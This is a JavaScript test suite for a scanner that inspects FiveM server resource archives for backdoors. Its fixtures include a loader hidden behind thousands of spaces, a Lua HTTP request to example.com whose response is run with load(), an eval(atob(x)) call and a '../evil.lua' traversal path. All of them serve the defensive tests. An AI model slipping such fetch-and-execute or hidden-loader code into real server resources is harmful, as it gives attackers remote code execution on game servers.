import assert from "node:assert/strict";
import { test } from "node:test";
import { strToU8, zipSync } from "fflate";
import { scanEntries, scanFiles, scanZip } from "../src/index.js";

// Backdoor *shapes* only; none of this is real malware.
const MANIFEST = "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'";
const HIDDEN = `print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end`;
const REMOTE = "PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)";

test("a server archive: every resource is read and findings carry the full path", async () => {
  const resources = Object.fromEntries(
    Array.from({ length: 60 }, (_, i) => [
      [`resources/[jobs]/job${i}/fxmanifest.lua`, strToU8(MANIFEST)],
      [`resources/[jobs]/job${i}/server.lua`, strToU8(i === 59 ? HIDDEN : "print('job')")],
    ]).flat(),
  );
  const report = await scanZip(zipSync(resources));
  assert.equal(report.scanned, 120);
  assert.equal(report.findings.length, 1);
  assert.deepEqual([report.findings[0].code, report.findings[0].severity, report.findings[0].path, report.findings[0].line], ["LAB-SEC-107", "error", "resources/[jobs]/job59/server.lua", 2]);
});

test("JS gets the hidden-code check, Lua the loaders, and a file that doesn't parse is kept", () => {
  const report = scanFiles({ "web/app.js": `const a = 1;${" ".repeat(600)}eval(atob(x))`, "server.lua": REMOTE, "broken.lua": "function(" });
  assert.deepEqual(report.findings.map((f) => f.code).sort(), ["LAB-SEC-101", "LAB-SEC-107", "LAB-SEC-111"]);
  assert.deepEqual(report.unparsed, ["broken.lua"]);
  assert.deepEqual([report.scanned, report.javascript, report.notAnalyzed, report.verdict], [1, ["web/app.js"], 2, "hidden"]);
});

test("ordinary code is clean", () => {
  assert.deepEqual(scanFiles({ "server.lua": "RegisterCommand('hi', function() print('hi') end)" }).findings, []);
});

test("names what it could not read: compiled Lua, escrow, nested archives, executables", async () => {
  const report = await scanZip(
    zipSync({
      "a/fxmanifest.lua": strToU8(MANIFEST),
      "a/server.lua": strToU8("\x1bLua\x54\x00"),
      "b/client.fxap": new Uint8Array([1, 2]),
      "b/client.lua": new Uint8Array([0xff, 0xfe, 0x00]),
      "extras/nested.zip": new Uint8Array([1]),
      "tools/install.bat": strToU8("echo"),
      // Real AppleDouble metadata (magic 0x00051607) is skipped; a `._` name alone is not.
      "__MACOSX/a/._server.lua": new Uint8Array([0, 5, 22, 7, 0, 2, 0, 0]),
    }),
  );
  // Non-UTF-8 bytes are read as Latin-1 (Lua reads bytes): they don't parse, so only the text checks ran.
  assert.deepEqual([report.unreadable, report.unparsed, report.escrowed, report.archives], [["a/server.lua"], ["b/client.lua"], ["b/"], ["extras/nested.zip"]]);
  assert.deepEqual(report.findings.map((f) => f.code), ["LAB-PKG-004"]);
  assert.equal(report.scanned, 1);
  assert.equal(report.verdict, "suspicious");
});

test("paths that escape the extraction folder are reported", () => {
  const report = scanEntries(["../evil.lua", "r/server.lua"], { "r/server.lua": "print(1)" }, { unreadable: [], skipped: [] });
  assert.deepEqual(report.findings.map((f) => f.code), ["LAB-PKG-005"]);
});

test("what isn't a ZIP is refused", async () => {
  await assert.rejects(scanZip(strToU8("not a zip")), { message: "invalid_zip" });
});
